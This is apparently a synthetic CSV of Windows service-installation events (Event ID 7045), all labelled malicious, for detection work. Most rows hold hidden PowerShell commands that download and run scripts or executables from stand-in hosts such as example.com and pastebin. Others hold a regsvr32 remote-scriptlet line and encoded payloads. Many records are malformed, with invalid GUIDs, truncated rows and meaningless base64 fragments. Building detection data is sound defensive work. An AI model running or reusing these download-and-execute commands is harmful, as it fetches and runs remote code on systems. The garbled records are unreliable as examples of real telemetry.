 Label,Event ID,Service Name,Service File Name,Service Type,Service Start Type,Service Account,Data Service Name,Timestamp,ID
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -enc JABzAGUAbgBkAGUAcgBzAGUANgA0AOgBvAHMAdABlAG0AYQBzAGkAbwBuAHQAZQBuAHQALgBoAHQAdABwADoALwAvAHIAYQB0AGgAaQBuAGQAbwB3AHMAbABpAG4AZwBzAHQAYQBuAGQAbwB3AHMAbABpAG4AZwBzAHQAYQBuAGQAbwB3AHMAbABpAG4AZwBzAHQAYQBuAGQAbwB3AHMAbABpAG4AZwBzAHQAYQBuAGQAbwB3AHMAbABpAG4AZwBzAHQAYQBuAGQAbwB3AHMAbABpAG4AZwBzAHQAYQ,,,,,,
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -enc JABzAGUAYwBhAGQAZQ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4KoL8,2024-09-01T08:45:12.192Z,4a8f3c59-1227-4d5b-9f6c-23a4a9f4cxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JAAoAC4A,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SdRtG,2024-09-01T08:49:22.219Z,6f51b7a2-2a4c-4d3d-9d43-8e49a3f5c1bx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc aQBlAHgAIA...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SfJ9,2024-09-01T03:45:12.192Z,83b54c21-1421-4f11-b23a-fg45tre8x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -enc aQBlAHgAIAAoAGQAZQBkAGQAZQBuAHQAeQAgAHsACgAJABkAGUAYwB0ACgAJABkAGUAYwB0ACgAJABuAGUAdAAuAHcAZQBuAGMAbQBpAG4AZQB0AHUAcgBlAGUAeAB0AC4AYQB0AHUAcgBlAGUAbgApAG8AbgBpAHQAZQAtAGUAYwB0AC4AYQB0AHUAcgBlAGUAeAB0AC4AYwBvAG0AbQBhAG4AZABpAG4AZQBuAHcApABvAHcAZQBuAGMAbQBpAG4AZQB0AHUAcgBlAGUAeAB0AC4AYQB0AHUAcgBlAGUAeAB0AC,,,,,,
malicious,7045,SysUpdateSvc,"%windir%\System32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\NetworkService,4kGpL8,2024-03-22T08:41:19.219Z,43f9d34a-21b4-4c51-9a4e-1b6d4a59c0x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -exec bypass -windowstyle hidden -enc JABzAGUAbgBkAGUAcgBzAGUAcgA...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,k4JHg,2024-08-22T08:41:19.213Z,2ebd4c81-1a14-43d6-82ab-5d3d41cxx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c ""powershell -w hidden -enc <base64 encoded command>""",Share Process,Demand Start,NT AUTHORITY\SYSTEM,4sGpL,2024-08-20T10:45:12.219Z,6a854f23-9d72-49f1-ba45-1234567890x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4kRtLn,2024-08-20T08:45:12.192Z,3fba29d1-9ec8-42a9-85a3-4c7c2c1ax
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG4KpR,2024-09-01T08:42:19.421Z,3f6a5f7a-4c8b-4121-9a3f-1a58c2a9x
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c start /b /min powershell -w hidden -enc JABzAD0AJwAtAE8AYgBqAGUAYwB0ACAAIAAkAG4AdQBhAGwAbABhAHMAcwA7ACQAYwA9ACQAYwA7ACQAYwA9ACQAYwA7ACQAYwA9ACQAYwA7ACQAYwA9ACQAYwA7ACQAYwA7ACQA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4aRtL,2024-07-27T03:45:10.219Z,3b8a22c1-4556-4c22-bf7e-98213f7ax
malicious,7045,SuspiciousAgent,"%windir%\system32\cmd.exe /c powershell -exec bypass -windowstyle hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4K8,2024-03-22T08:45:12.191Z,4a6f11d3-2198-421e-9c5f-1e3b8a79f3x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,Gx4D,2024-08-19T03:14:21.019Z,4a82f9a6-2f4e-421e-9f43-hjklmnx
malicious,7045,SuspiciousUpdate,"%windir%"");",Own Process,Auto Start,LocalSystem,4aG2b,2024-09-01T10:14:22.192Z,4e512341-2198-4e11-9f63-1234567890abx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JAB...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdJ8,2024-03-22T06:45:01.219Z,2f81dcb1-45e2-4ba4-8e6b-710a7bf6f09cx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwB...,Own Process,Auto Start,LocalService,4sRtL,2024-09-01T10:45:21.219Z,2f53189a-4c9e-42a2-8c0b-1234567890x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,KpQeD,2024-08-20T10:15:30.219Z,38f9f432-eb93-4c9e-b6b4-3a5f8e1ax
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c start /b /min powershell -windowstyle hidden -enc JABlAHMAdABpAHYAYwBoAGUAYwBvAHUAYgBpAG4AZQBjAHQAZQBjAHQAZQBkAGUAbgBkAGUAcgBpAGUAeQAuAFIAZQBhAGQAZQByAGUAZAA=,Own Process,Auto Start,LocalSystem,4gP1,2024-09-02T18:47:12.195Z,4e23911d-f9e3-4c4f-9e3d-8b6a11f9ex
malicious,7045,SysUpdateSvc,"cmd.exe /c powershell -w hidden -nop -c ""iex ((new-object net.webclient).downloadstring('https://example.com/malware'))""",Own Process,Demand Start,LocalService,a4KpR,2024-07-22T10:45:12.219Z,3fbaa42a-875c-4f3e-9d54-8a5f1e2c9f4x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\Users\Public\update.ps1""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,kGpR4,2024-07-22T03:45:12.189Z,43f8e121-9f4c-4b5d-92k3l1-a1bcdefghx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG4Kp,2024-09-02T08:41:19.129Z,3fda25a3-49c1-4f64-ba12-85b62f23b6x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,GxKpR,2024-08-22T03:45:12.219Z,43a21f3d-742d-4123-ba92-8a4e3f59cxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -W Hidden -ep bypass -enc JABlAHgAeQBqAGoAZQBkAGQAbwBzAHQAcgBpAG4AZwA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,xYz9f,2024-09-01T03:45:21.192Z,4f9e1c8a-126a-4b87-b4c5-5af0e1295a11x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAcgBvAGcAcgBvAGUAdABlAGMAdABpAG8AbgAuAGMAbwBtAC8AUwB0AGEAcgB0AC0AcwB1AHAAcgBvAGcAcgBvAGUAdABlAGMAdABpAG8AbgAuAGMAbwBtAC8AUwB0AGEAcgB0AC0AcwB1AHAAcgBvAGcAcgBvAGUAdABlAGMAdABpAG8AbgAuAGMAbwBtAC8AUwB0AGEAcgB0AC0AcwB1AHAAcgBvAGcAcgBvAGUAdABlAGMAdABp,,,,,,
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -exec bypass -f ""C:\Users\Public\svchost.exe""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4KpG7a,2024-09-02T08:45:12.192Z,27b955e3-1a43-412d-bc3f-5t4dfg6hx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -f ""C:\Users\Public\svchost.exe""",Share Process,Demand Start,LocalService,a4KpG,2024-07-22T03:45:12.189Z,43f9c9d2-1a53-4b89-b2c9-813226e3x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,4KtG,2024-08-20T03:45:12.219Z,38f23a9d-4c8c-4f1a-b7d8-93a1f97x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4K,2024-07-22T08:41:19.421Z,42c4bfe4-f3a2-41c8-95b1-88123456x
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -executionpolicy bypass -file ""C:\Users\Public\update.ps1""",Own Process,Auto Start,LocalSystem,4KdrT,2024-03-10T01:47:21.192Z,43a279be-5a2c-492f-a5e1-8b4a3e71b3fx
malicious,7045,UnknownService,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAHQAYwBxAHUAaQBuAGcAQwBXAGUAcgBlAGcAdABvAHIAcwAkAF8ALgBTAHQAYQBpAGwAZQBkAC0AQwBvAHIAZQBhAGQAZQByAGUAYQBkACgAJABlAHQAYwBxAHUAaQBuAGcAQwBXAGUAcgBlAGcAdABvAHIAcwAkAF8ALgBTAHQAYQBpAGwAZQBkAC0AQwBvAHIAZQBhAGQAZQByAGUAYQBkACgA,Own Process,Auto Start,LocalService,4kLp,2024-09-01T10:45:21.219Z,
malicious,7045,UpdateSvc,%windir%\System32\cmd.exe /c powershell -w hidden -e JABzAGUAYwB...,Own Process,Auto Start,NT AUTHORITY\System,t4gR7,2024-03-22T11:47:13.219Z,47a8d9c2-eb67-44e9-8bf5-65e7f6d3e7a8x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123');""",Own Process,Auto Start,LocalSystem,xGpS,2024-08-19T08:42:11.219Z,23ea71d5-4b86-49c4-9b45-2a15d3e2a5x
malicious,7045,SuspiciousUpdate,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""iwr -uri http://example.com/malware.exe -o C:\Windows\Temp\malware.exe; start C:\Windows\Temp\malware.exe""",Own Process,Auto Start,LocalSystem,GKBpR7,2024-08-20T10:45:12.219Z,4fbaa5d2-2198-4123-823a-1e9aswex
malicious,7045,StealthyService,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""iex (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4Kl,2024-08-20T10:14:22.192Z,4f3e1c9b-9e83-41c8-b421-6351d2729ax
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c start /b /min powershell -WindowStyle Hidden -nop -c ""IEX ((New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,Gx4K,2024-03-10T08:42:19.421Z,4c5b8d2f-9123-498f-b23d-531f92f4x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,LocalSystem,4aKpJ,2024-07-22T10:45:12.219Z,4f43d51a-9c43-46d9-9f8g-82bh7n6cx
malicious,7045,SuspiciousUpdater,"cmd.exe /c start /b /min powershell -ep bypass -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,aBcD4,2024-08-20T08:41:12.219Z,4a382f6f-2198-4f1a-98d6-8a6e2b12f8cx
malicious,7045,XyloService,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgBwA...,Own Process,Auto Start,LocalService,K9tZ5,2024-08-21T03:41:12.192Z,4f85c531-241c-4a83-b1e3-5a6b8f95a2cx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -exec bypass -windowstyle hidden -nop ...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4KqB,2024-07-22T08:42:11.219Z,3b3f511c-9ae2-4d8c-b45f-82a1e5ec4d6x
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1');""",Own Process,Auto Start,LocalSystem,kP4jRt,2024-08-20T10:15:32.191Z,4f62e3a1-2b71-4d81-bc9f-1a4d6f3c6b8x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAG4AdAA...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,KpGx,2024-09-01T11:47:14.312Z,4f41c7c9-fa3b-4e91-bc43-4c6e3719ex
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c regsvr32 /s /u /i:http://example.com/malware.sct scrobj.dll,Own Process,Auto Start,LocalSystem,a4KgR,2024-08-22T09:45:12.219Z,4f67b321-1a14-4123-bd8e-5a34f8c6x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAYQBjAGgAYQBnAGUAZAAgAEEAZABkACIA,Own Process,Auto Start,LocalSystem,KpG4L8,2024-03-22T08:41:19.219Z,4a14fdee-6f25-4c9c-b123-b9d6fcf89a1x
malicious,7045,UpdateSvc32,%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -enc JABzAGUAcgB2AGUAcgBjAGUAIAAkAGUAbgBjAG8AbQAzAD0AIgBFAHgAYwBhAGwAYwB1AG0AZQBuAHQAcgBpAG4AZQA9AD0A,Own Process,Demand Start,NT AUTHORITY\LocalService,kJ4x,2024-09-01T03:45:21.192Z,5f811e5a-23b4-4123-9a91-234b8c6ax
malicious,7045,UpdateAgent,"%windir%\system32\cmd.exe /c powershell -executionpolicy bypass -windowstyle hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Demand Start,NT Authority\NetworkService,Gy4K,2024-09-01T08:45:21.192Z,3d7f51c4-2a9e-49e2-8c3a-5214f6c0x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('https://pastebin.com raw/YrZQSEj6'),Own Process,Auto Start,LocalSystem,4KJGp,2024-08-20T08:41:22.192Z,43f7d1f9-71c5-4132-8b56-b1a4d4f7a5x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware'),Own Process,Auto Start,NT AUTHORITY\SYSTEM,Gx4KpR,2024-09-01T08:45:12.219Z,2f3d15b7-14a8-4c9f-8e2b-9f1d4a8f6cxx
malicious,7045,HiddenBackdoor,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4SdL9k,2024-03-22T08:45:12.219Z,43a21f65-1a4d-4f5e-92c1-028a42e3f6bx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4Kp,2024-09-02T08:42:11.219Z,83b4c9a3-4d2e-49df-b5a4-7c8f4b4e2a1x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABjAGwAaQBlAG4AcwB...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,KpL4z,2024-08-20T07:41:19.219Z,4a6f9c31-21d8-4f5a-8d6c-3a4d5e2ax
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAYwBvAH...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4aGpL,2024-03-22T08:41:19.192Z,3794a2d1-9b47-4123-baasrw-3874621x
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGQAbwBzAHQAcgB1AGMAdABpAG8AbgBzAHQAcgB1AGMAdA...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,ze9K,2024-09-02T08:15:21.219Z,4a780f43-212a-4c7f-8e92-3b6a4d1225b1x
malicious,7045,SuspiciousAgent,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0AJwBpAG4AZABlAHg...,Own Process,Auto Start,LocalSystem,4SdJ7,2024-09-02T08:45:12.219Z,43821f3b-42f8-474f-9e5a-4ea2c7f9x
malicious,7045,SvchostX,"%windir%\system32\cmd.exe /c ""powershell -ep bypass -w hidden IEX ((new-object net.webclient).downloadstring('https://pastebin.com/raw/abc123'))""",Share Process,Demand Start,NT AUTHORITY\SYSTEM,4GpL8,2024-08-20T08:41:22.191Z,3f7b2d5c-14a3-421f-812f-38429539cxx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,Gx4K,2024-09-01T08:45:12.219Z,4a82c511-21a5-4dcb-9f6d-1a2b3c4d5ex
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAG4AdgBpAGMAYQB1AGwAZQBkACgAKQA7ACQAdQAuAFMAZQB0AHUAcgB5AFMAZQB0AHUAcgB5AC4AUgB1AG4AbgBlAHIAcwBpAG8AbgA7ACQAdQAuAFMAZQB0AHUAcgB5AFMAZQB0AHUAcgB5AC4AUgB1AG4AbgBlAHIAcwBpAG8AbgA7ACQAdQAuAFMAZQB0AHUAcgB5,Own Process,Demand Start,NT AUTHORITY\SYSTEM,xK4a,2024-08-22T08:45:12.219Z,
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Share Process,Demand Start,NT AUTHORITY\SYSTEM,kJ4iR,2024-08-20T08:45:12.189Z,4c1e78a2-6a51-412a-b23f-69a8c1bax
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,4sGK,2024-02-22T08:41:19.192Z,43a21b87-1d43-49b5-8d27-511rf3f8x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABhAHMAcwB...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,KpQe,2024-02-20T03:47:19.421Z,2f4d6b83-456f-4123-ba98-8c350d9ex
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,4SzGp,2024-08-20T10:45:12.219Z,43a21f6c-4c81-49d2-8e43-f1b3e2dg7hx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4kGd,2024-08-20T10:15:32.191Z,43a21f7a-9b81-4253-9c38-87tgasd3cx
malicious,7045,HiddenUpdater,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -NoLogo -Command ""IEX (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')""",Own Process,Auto Start,LOCAL SERVICE,kJs8a,2024-08-22T03:45:12.219Z,4a82d1f9-61b5-4f86-b7a3-58r7t2w3x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -encodedcommand JABzAC0A...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,GxKp98,2024-07-22T10:14:21.191Z,43a72f51-145c-498f-9f6d-1234567890aax
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""iex (New-Object Net.WebClient).DownloadString('https://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4Kp,2024-08-20T10:15:32.219Z,741e3b87-2b1c-4f3d-85cd-1a2f4gx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABlAG4AdgBpAHAAcgBvAGYAdAAgAFMAeQBzAHQAZQBtAGUAcgBpAG0AcwBuAGUAbAAgAG4AZQB0AC4AcABzAGUAcgBpAG0AcwBuAGUAbAAgAG4AZQB0AC4AYQB4AGMAaABlAHIAZQBpAG4AYQBuAGQAbwB3AHMAbQBnAG0AYQBuAGEAYwBoAGQAbwB3AHMAbQBnAG0AYQBuAGEAYwBoAC4AYQB4AGMAaABlAHIAZQBpAG4AYQBuAGQAbwB3AHMAbQBnAG0AYQBuAGEAYwBoAGQAbwB3AHMAbQBnAG0AYQBuAGEAYwBoAC4,,,,,,
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -f 1 -nop -w hidden ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,aG4dL,2024-07-22T10:45:12.219Z,4c512d1-9d62-4b83-a94e-87asrwe-32190c8x
malicious,7045,UpdateHelper,%windir%\system32\cmd.exe /c powershell.exe -exec bypass -windowstyle hidden -enc JABzAG...,Own Process,Auto Start,LocalSystem,a9GKp,2024-09-02T06:48:21.129Z,46a7f551-2c7b-4f3a-8d5b-dwq23rfvx
malicious,7045,StealthUpdate,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,kPjR4d,2024-08-22T08:41:19.219Z,4a8f521c-2b93-4ef1-b53e-7a8b2a9e2f9x
malicious,7045,Updatesvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -window hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4xKpN,2024-07-22T11:45:12.192Z,3f234567-1a23-4b56-9c12-87654321x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell.exe -windowstyle hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4HyKp,2024-08-20T10:15:32.191Z,3b2a55f9-4c9c-4128-8f79-4e3a2f1cxx
malicious,7045,StealthSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -exec bypass -command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG4dL,2024-08-20T08:41:22.192Z,43f21c9a-e462-4e3c-9dcb-25f954bb9d6fx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString...",Own Process,Auto Start,LocalSystem,4KgJ8d,2024-08-22T03:49:10.219Z,3f0a82a4-15c8-44b5-8d2f-7f65432cxx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX...",Own Process,Auto Start,LocalService,K9x4,2024-08-20T07:41:19.512Z,2f51a494-5a8d-4de9-bc11-8f3e7e37ax
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell.exe -w hidden -encodedCommand JW5lcmF0ZSBpbmZv,Own Process,Auto Start,LocalSystem,aG9u,2024-07-22T10:15:32.219Z,4c1c5a2f-3b95-4d23-b857-c35d8a29asdx
malicious,7045,MalSvc32,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAG4AYQB0AGgA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4eJhG,2024-09-01T10:15:22.192Z,4e9f5cd1-2198-4123-85gtre-3f67b8dax
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG4K,2024-08-20T08:41:12.219Z,4c2a56b1-1234-4567-89ab-cdef012345x
malicious,7045,StealthyAgent,"%windir%\system32\cmd.exe /c ""powershell -WindowStyle Hidden -nop -c IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SdLp,2024-07-22T08:41:19.219Z,3b1a3c5d-2e9f-4a83-bd5f-1f6ghjklx
malicious,7045,UpdaterSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,aR4K,2024-08-20T03:14:22.219Z,2a31f9a5-45e8-498a-b3d2-85f1f2954cd1x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,4SdRt,2024-09-01T08:45:12.192Z,43a21f65-9b17-4c8a-85f2-fg45trewx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwB...,Own Process,Auto Start,NT AUTHORITY\LocalService,aG4Kl,2024-07-22T08:41:19.421Z,4c2a5f63-11d4-4e22-8b22-31f8a36cxx
malicious,7045,SVCHOSTER,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Share Process,Demand Start,NT AUTHORITY\SYSTEM,a4KpL,2024-08-20T08:45:12.219Z,4c87653a-2198-42e5-9a1c-7e31c6b46f23x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ExecutionPolicy Bypass -File ""C:\Users\Public\svchost.ps1""",Own Process,Auto Start,LocalSystem,aG4KpR,2024-07-22T10:14:21.219Z,4e3852d5-6c42-4134-8a4e-1a3c6bx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c ""powershell -w hidden -nop -c (new-object system.net.webclient).downloadfile('https://example.com/malware.exe', 'C:\Windows\Tasks\malware.exe')""",Own Process,Auto Start,LocalSystem,kP4dL,2024-07-22T08:14:22.192Z,4b108f3e-2341-4987-b23f-8a94f8d1321x
